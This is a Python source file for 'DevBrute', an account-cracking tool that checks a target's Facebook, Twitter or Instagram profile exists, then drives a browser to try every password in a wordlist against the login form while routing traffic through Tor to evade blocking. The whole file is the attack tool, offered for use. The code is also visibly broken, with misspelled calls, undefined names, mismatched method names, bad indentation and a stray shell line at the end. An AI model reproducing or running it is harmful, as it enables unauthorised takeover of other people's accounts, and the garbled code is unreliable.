import argparse, os, random, re, sys, time, urllib, urllib.request, urllib.parse, threading, requests, socket, json,
hashlib, base64, signal, subprocess, webbrowser
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from pyvirtualdisplay import Display

# DevBrute Banner
print("""\033[1;37m
 _____             ____             _       
|  __ \           |  _ \           | |      
| |  | | _____   _| |_) |_ __ _   _| |_ ___ 
| |  | |/ _ \ \ / /  _ <| '__| | | | __/ _ \
| |__| |  __/\ V /| |_) | |  | |_| | ||  __/
|_____/ \___| \_/ |____/|_|   \__,_|\__\___|""")

url = input('\033[1;34m[?]\033[0m Enter target URL: ')
reload(sys)
sys.setdefaultenciding('utf8')


def main():
    parser = argparse.ArgumentParser(description='BruteForce Framework written by Devprogramming')
    required = parser.add_argument_group('required arguments')
    required.add_argument('-s', '--service', dest='service', required=True)
    required.add_argument('-u', '--username', dest='username', required=True)
    required.add_argument('-w', '--wordlist', dest='password', required=True)
    parser.add_argument('-d', '--delay', type=int, dest='delay')

    args = parser.parse_args()

    service = args.service
    username = args.username
    wordlist = args.password
    delay = args.delay or 1

    if not os.path.exists(wordlist):
        print("[Error] Wordlist not found")
        exit(1)

    if service == "facebook":
        fb_name = input("Please Enter the Name of the Facebook Account: ")
        os.system("clear")
        
        os.system("/etc/init.d/tor restart && rm -rf tmp/ geckodriver.log") 

br = Bruter(service, username, wordlist, delay, fb_name=fb_name)
        br.execute()


class Bruter:
    def __init__(self, service, username, wordlist, delay, fb_name=None):
        self.service = service
        self.username = username
        self.wordlist = wordlist
        self.delay = delay
        self.fb_name = fb_name

        def stop_tor(self):
        # Stopping Tor
        os.system("rm -rf tmp/ geckodriver.log && service tor stop")
        exit(1)


     def execute(self):
        if self.usercheck(self.username) == 1:
            print("[Error] Username does not exist")
            exit(1)

        print("[OK] Checking account existence\n")
        self.web_bruteforce(self.username, self.wordlist, self.service, self.delay)


    def usercheck(self, username):
        display = Display(visible=0, size=(800, 600))
        display.start()

        driver = webdriver.Firefox()

       try:
            if self.service == "facebook":
                driver.get("https://www.facebook.com/public/" + self.fb_name)
                assert "We couldn't find anything for" not in driver.page_source
            elif self.service == "twitter":
                driver.get("https://www.twitter.com/" + username)
                assert "Sorry, that page doesn’t exist!" not in driver.page_source
            elif self.service == "instagram":
                driver.get("https://instagram.com/" + username)
                assert "Sorry, this page isn't available." not in driver.page_source

            driver.quit()
            return 0

        except AssertionError:
            driver.quit()
            return 1


    def webBruteforce(self, username, wordlist, service, delay):
        print("\n- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)
        driver = webdriver.Firefox()
        wordlist = open(wordlist, 'r')
        
        for i in wordlist.readlines():
            password = i.strip("\n")
            try:               
                driver = webdriver.Firefox()
                if service == "facebook":
                    driver.get("https://touch.facebook.com/login?soft=auth/")
                    WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
                    elem = driver.find_element_by_name("email")

                elif service == "twitter":
                    driver.get("https://mobile.twitter.com/session/new")
                    WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')

                    elem = driver.find_element_by_name("session[username_or_email]")

                elif service == "instagram":
                    driver.get("https://www.instagram.com/accounts/login/?force_classic_login")
                    WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
                    elem = driver.find_element_by_name("username")

                elem.clear()
                elem.send_keys(username)

                if service == "facebook":

                    elem = driver.find_element_by_name("pass")

                elif service == "twitter":

                    elem = driver.find_element_by_name("session[password]")

                elif service == "instagram":

                    elem = driver.find_element_by_name("password")

                elem.clear()
                elem.send_keys(password)
                elem.send_keys(Keys.RETURN)


                if service == "facebook":
                    assert (("Log into Facebook | Facebook") in driver.title)
                elif service == "twitter":
                    if driver.current_url == "https://mobile.twitter.com/home":
                        print(G + ("  Username: {} \t| Password found: {} \n".format(username,password)) + W)
                        driver.quit()
                        self.stopTOR()

                elif service == "instagram":
                    assert (("Log in — Instagram") in driver.title)

                driver.quit()

                my_ip = urlopen("http://ip.42.pl/raw").read()

                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
                socket.socket = socks.socksocket

                print(O + ("  Password: {} \t| Failed \t| IP : {} \n ".format(password,my_ip)) + W)
                sleep(delay)

            except AssertionError: 
                print(G + ("  Username: {} \t| Password found: {}\n".format(username,password)) + W)
                driver.quit()
                self.stopTOR()

            except Exception as e:
                print(R + ("\nError : {}".format(e)) + W)
                driver.quit()
                self.stopTOR()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(R + "\nError : Keyboard Interrupt" + W)
        os.system("rm -rf tmp/ geckodriver.log && service tor stop")
        exit(1) 
        python setup.py

